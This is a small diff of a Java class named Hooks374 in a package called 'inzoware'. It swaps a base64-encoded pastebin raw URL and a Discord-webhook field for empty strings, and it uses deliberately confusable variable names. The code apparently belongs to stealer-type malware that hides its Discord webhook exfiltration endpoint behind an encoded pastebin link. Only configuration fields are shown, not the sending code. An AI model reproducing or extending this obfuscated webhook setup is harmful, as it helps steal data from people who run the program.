@@ -1,6 +1,5 @@
 package com.inzo.technologies.inzoware.hooks;
 
-
 import java.io.InputStream;
 import java.net.URL;
 import java.util.ArrayList;
@@ -14,8 +13,9 @@ public class Hooks374 {
 
 	public static ArrayList<String> realHooks = new ArrayList<>();
 	public static ArrayList<String> INZOWEBHOOK = new ArrayList<String>();
-	public static String lIIlIlIll = "webhook"; // discord webhoook url encoded in base64
-	public static String IIllIlIll = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RVYjBIM3R1"; // pastebin url encoded in base64
+
+        public static final String IIllIlIll=""; // pastebin url encoded in base64
+        public static final String lIIlIlIll=""; // discord webhoook url encoded in base64
 
 	public static String getyou() {
 
